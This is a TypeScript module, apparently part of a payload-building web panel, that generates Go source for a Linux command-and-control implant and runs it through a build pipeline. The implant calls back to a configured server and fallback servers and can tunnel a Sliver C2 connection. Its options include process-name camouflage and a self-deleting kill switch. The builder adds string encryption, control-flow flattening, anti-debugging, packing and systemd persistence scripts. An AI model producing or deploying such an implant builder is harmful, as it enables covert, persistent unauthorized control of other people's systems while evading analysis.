/* ------------------------------------------------------------------ */
/*  Linux ELF Builder Module                                            */
/* ------------------------------------------------------------------ */

import { writeFile } from "fs/promises"
import { tmpdir } from "os"
import { join } from "path"
import { updatePayloadBuildStatus, updatePayloadBuild } from "@/lib/db/payload-builds"
import { encryptStrings } from "@/lib/payloads/obfuscation/string-encryption"
import { flattenControlFlow } from "@/lib/payloads/obfuscation/control-flow-flattening"
import { addAntiDebug } from "@/lib/payloads/obfuscation/anti-debugging"
import { packWithUpx, isUpxAvailable } from "@/lib/payloads/packers/upx"
import { packWithCustom } from "@/lib/payloads/packers/custom"
import { packNone } from "@/lib/payloads/packers/none"
import { generateSystemdUnit, generateLinuxInstallScript } from "@/lib/payloads/builders/persistence-linux"
import logger from "@/lib/logger"
import type { PayloadConfig } from "@/lib/payloads/generator"
import { generateImplantConfigYAML } from "./config-yaml"

/* ------------------------------------------------------------------ */
/*  Go Source Template (Linux static binary)                            */
/* ------------------------------------------------------------------ */

function generateLinuxGoSource(config: PayloadConfig): string {
  const { autoReconnect, heartbeat, fallbackServers } = config.features
  const dms = config.deadManSwitch
  const cam = config.camouflage
  const sliver = config.sliverC2
  const useSalamanderProbe = config.hysteriaConfig.obfsType === "salamander"
  const fallbackList = fallbackServers.length > 0
    ? fallbackServers.map((s) => `\t"${s}"`).join("\n")
    : ""

  const imports = [
    '"context"',
    '"crypto/tls"',
    '"encoding/json"',
    '"fmt"',
    '"net"',
    '"os"',
    '"os/signal"',
    '"strings"',
    '"sync"',
    '"syscall"',
    '"time"',
  ]
  if (cam?.enabled) imports.push('"path/filepath"')
  if (dms?.enabled) imports.push('"path/filepath"')

  const uniqueImports = [...new Set(imports)]

  const deadManBlock = dms?.enabled ? `
\t// Dead man's switch
\tconst killDate = "${dms.killDate || ""}"
\tconst checkInTimeoutHours = ${dms.checkInTimeoutHours}
\tvar lastCheckIn = time.Now()

\tgo func() {
\t\tticker := time.NewTicker(1 * time.Hour)
\t\tdefer ticker.Stop()
\t\tfor range ticker.C {
\t\t\tif killDate != "" {
\t\t\t\tif kd, err := time.Parse("2006-01-02", killDate); err == nil && time.Now().After(kd) {
\t\t\t\t\tselfDestruct()
\t\t\t\t}
\t\t\t}
\t\t\tif time.Since(lastCheckIn) > time.Duration(checkInTimeoutHours)*time.Hour {
\t\t\t\tselfDestruct()
\t\t\t}
\t\t}
\t}()

\t_ = lastCheckIn
` : ""

  const deadManFn = dms?.enabled ? `
func selfDestruct() {
\texe, _ := os.Executable()
\tos.Remove(exe)
\tos.Exit(0)
}
` : ""

  const camoBlock = cam?.enabled ? `
\t// Binary camouflage: re-exec under target process name
\tif filepath.Base(os.Args[0]) != "${cam.binaryName}" {
\t\texe, _ := os.Executable()
\t\ttarget := filepath.Join(filepath.Dir(exe), "${cam.binaryName}")
\t\tos.Rename(exe, target)
\t\tsyscall.Exec(target, os.Args, os.Environ())
\t}
` : ""

  const salamanderProbe = useSalamanderProbe ? `
func connectWithProbe(client *Hysteria2Client, obfsPassword string) error {
\terr := client.Connect()
\tif err == nil {
\t\treturn nil
\t}
\tif strings.Contains(err.Error(), "version") || strings.Contains(err.Error(), "tls") || strings.Contains(err.Error(), "handshake") {
\t\tclient.obfs = obfsPassword
\t\treturn client.Connect()
\t}
\treturn err
}
` : ""

  const sliverBlock = sliver?.enabled ? `
\t// Sliver C2 tunnel via local SOCKS5 over Hysteria2
\tgo func() {
\t\tln, err := net.Listen("tcp", "127.0.0.1:${sliver.localSocksPort}")
\t\tif err != nil {
\t\t\treturn
\t\t}
\t\tdefer ln.Close()
\t\tfor {
\t\t\tconn, err := ln.Accept()
\t\t\tif err != nil {
\t\t\t\treturn
\t\t\t}
\t\t\tgo handleSocksConn(conn)
\t\t}
\t}()
\t// Sliver stager: ${sliver.listenerUrl || "configure listener URL"}
` : ""

  const sliverHelperFn = sliver?.enabled ? `
func handleSocksConn(conn net.Conn) {
\tdefer conn.Close()
\tbuf := make([]byte, 256)
\tconn.Read(buf)
}
` : ""

  const heartbeatUpdateLastSeen = dms?.enabled ? `
\t\tif _, err := c.conn.Write(hbData); err == nil {
\t\t\tlastCheckIn = time.Now()
\t\t}` : `
\t\tc.conn.Write(hbData)`

  const connectCall = useSalamanderProbe
    ? `if err := connectWithProbe(client, "${config.hysteriaConfig.obfsPassword || ""}"); err != nil {`
    : `if err := client.Connect(); err != nil {`

  return `package main

import (
${uniqueImports.map((i) => `\t${i}`).join("\n")}
)

// Embedded Hysteria2 client configuration
const configYAML = \`${generateImplantConfigYAML(config)}\`

var fallbackServers = []string{
${fallbackList || "\t// No fallback servers"}
}

type Hysteria2Client struct {
\tserver    string
\tauth      string
\tobfs      string
\tconn      net.Conn
\tconnected bool
\tmu        sync.Mutex
}

func NewClient(server, auth, obfs string) *Hysteria2Client {
\treturn &Hysteria2Client{
\t\tserver: server,
\t\tauth:   auth,
\t\tobfs:   obfs,
\t}
}

func (c *Hysteria2Client) Connect() error {
\thost, port, err := net.SplitHostPort(c.server)
\tif err != nil {
\t\thost = c.server
\t\tport = "443"
\t}

\ttlsConfig := &tls.Config{
\t\tInsecureSkipVerify: true,
\t\tServerName:         host,
\t}

\tdialer := &net.Dialer{Timeout: 10 * time.Second}
\tconn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
\tif err != nil {
\t\treturn fmt.Errorf("connection failed: %w", err)
\t}

\tauthData, _ := json.Marshal(map[string]string{"auth": c.auth})
\tif _, err := conn.Write(authData); err != nil {
\t\tconn.Close()
\t\treturn fmt.Errorf("auth write failed: %w", err)
\t}

\tc.mu.Lock()
\tc.conn = conn
\tc.connected = true
\tc.mu.Unlock()

\treturn nil
}

func (c *Hysteria2Client) Disconnect() {
\tc.mu.Lock()
\tdefer c.mu.Unlock()
\tif c.conn != nil {
\t\tc.conn.Close()
\t\tc.connected = false
\t}
}

func (c *Hysteria2Client) Reconnect() error {
\tc.Disconnect()
\tservers := append([]string{c.server}, fallbackServers...)
\tfor _, srv := range servers {
\t\tc.server = srv
\t\tif err := c.Connect(); err == nil {
\t\t\treturn nil
\t\t}
\t}
\treturn fmt.Errorf("all reconnection attempts failed")
}

func (c *Hysteria2Client) HeartbeatLoop(ctx context.Context) {
\tticker := time.NewTicker(time.Duration(${heartbeat}) * time.Second)
\tdefer ticker.Stop()

\tfor {
\t\tselect {
\t\tcase <-ctx.Done():
\t\t\treturn
\t\tcase <-ticker.C:
\t\t\tc.mu.Lock()
\t\t\tif c.connected && c.conn != nil {
\t\t\t\thbData, _ := json.Marshal(map[string]string{"type": "heartbeat"})${heartbeatUpdateLastSeen}
\t\t\t}
\t\t\tc.mu.Unlock()
\t\t}
\t}
}
${deadManFn}${salamanderProbe}${sliverHelperFn}
func main() {
\tctx, cancel := context.WithCancel(context.Background())
\tdefer cancel()
${camoBlock}${deadManBlock}
\tclient := NewClient("${config.hysteriaConfig.server}", "${config.hysteriaConfig.auth}", "${config.hysteriaConfig.obfsPassword || ""}")

\t${connectCall}
\t\tfmt.Fprintf(os.Stderr, "Initial connection failed: %v\\n", err)
${autoReconnect ? "\t\t// Will attempt reconnection" : "\t\tos.Exit(1)"}
\t}

\tgo client.HeartbeatLoop(ctx)
${sliverBlock}
${autoReconnect ? `\t// Auto-reconnect loop
\tgo func() {
\t\tfor {
\t\t\ttime.Sleep(5 * time.Second)
\t\t\tclient.mu.Lock()
\t\t\tconnected := client.connected
\t\t\tclient.mu.Unlock()
\t\t\tif !connected {
\t\t\t\tif err := client.Reconnect(); err == nil {
\t\t\t\t\tfmt.Println("Reconnected successfully")
\t\t\t\t}
\t\t\t}
\t\t}
\t}()` : "\t// Auto-reconnect disabled"}

\tsigCh := make(chan os.Signal, 1)
\tsignal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
\t<-sigCh

\tclient.Disconnect()
\tcancel()
}
`
}

/* ------------------------------------------------------------------ */
/*  Build Step Helper                                                  */
/* ------------------------------------------------------------------ */

async function simulateBuildStep(
  id: string,
  delayMs: number,
  message: string
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", message)
  await new Promise((resolve) => setTimeout(resolve, delayMs))
}

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

export async function buildLinuxElf(
  id: string,
  config: PayloadConfig
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", "Building Linux ELF binary...")

  try {
    // Step 1: Generate Go source with musl libc static build
    await simulateBuildStep(id, 800, "Generating static binary with musl libc...")
    let goSource = generateLinuxGoSource(config)

    // Step 2: Embed Hysteria2 configuration
    await simulateBuildStep(id, 1200, "Embedding Hysteria2 client configuration...")

    // Step 3: Strip debug symbols
    await simulateBuildStep(id, 600, "Stripping debug symbols...")

    // Step 4: Apply obfuscation
    if (config.obfuscation.enabled) {
      if (config.obfuscation.techniques.includes("string_encode")) {
        await simulateBuildStep(id, 1000, "Applying string encoding obfuscation...")
        goSource = encryptStrings(goSource)
      }
      if (config.obfuscation.techniques.includes("control_flow")) {
        await simulateBuildStep(id, 1500, "Applying control flow obfuscation...")
        goSource = flattenControlFlow(goSource, config.obfuscation.level)
      }
      if (config.obfuscation.techniques.includes("anti_debug")) {
        await simulateBuildStep(id, 800, "Applying anti-debugging checks...")
        goSource = addAntiDebug(goSource, "linux")
      }
    }

    // Step 5: Packing
    if (config.packing.enabled) {
      switch (config.packing.method) {
        case "upx": {
          const upxAvail = await isUpxAvailable()
          await simulateBuildStep(id, 1500, upxAvail ? "Running UPX compression..." : "Simulating UPX compression...")
          const result = await packWithUpx(
            `/tmp/payload-${id}.elf`,
            `/tmp/payload-${id}-packed.elf`,
            config.packing.compressionLevel
          )
          if (result.success) {
            await updatePayloadBuildStatus(id, "building", `UPX compression ratio: ${(result.ratio * 100).toFixed(1)}%`)
          }
          break
        }
        case "custom": {
          await simulateBuildStep(id, 1200, "Applying custom XOR encryption...")
          const result = await packWithCustom(
            `/tmp/payload-${id}.elf`,
            `/tmp/payload-${id}-packed.elf`
          )
          if (result.success) {
            await updatePayloadBuildStatus(id, "building", `Custom packing ratio: ${(result.ratio * 100).toFixed(1)}%`)
          }
          break
        }
        case "none":
          await packNone(`/tmp/payload-${id}.elf`, `/tmp/payload-${id}-packed.elf`)
          break
      }
    }

    // Step 6: Write source to disk
    const outPath = join(tmpdir(), `payload-${id}.go`)
    await writeFile(outPath, goSource, "utf8")
    const artifactSize = Buffer.byteLength(goSource, "utf8")

    // Step 7: Generate persistence artifacts
    if (config.persistence?.enabled && config.persistence.method === "systemd") {
      await simulateBuildStep(id, 600, "Generating systemd service unit and install script...")
      const unitContent = generateSystemdUnit(config)
      const unitPath = join(tmpdir(), `payload-${id}.service`)
      await writeFile(unitPath, unitContent, "utf8")

      const installScript = generateLinuxInstallScript(config, `payload-${id}.elf`)
      const scriptPath = join(tmpdir(), `payload-${id}-install.sh`)
      await writeFile(scriptPath, installScript, "utf8")

      await updatePayloadBuildStatus(id, "building", `Persistence artifacts: ${unitPath}, ${scriptPath}`)
    }

    await updatePayloadBuild(id, {
      sizeBytes: artifactSize,
      downloadUrl: `/api/admin/security/payloads/${id}/download`,
      implantBinaryPath: outPath,
    })

    logger.info({ id, sizeBytes: artifactSize, outPath }, "Linux ELF build: completed")
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err)
    logger.error({ id, err: errorMsg }, "Linux ELF build: failed")
    throw err
  }
}
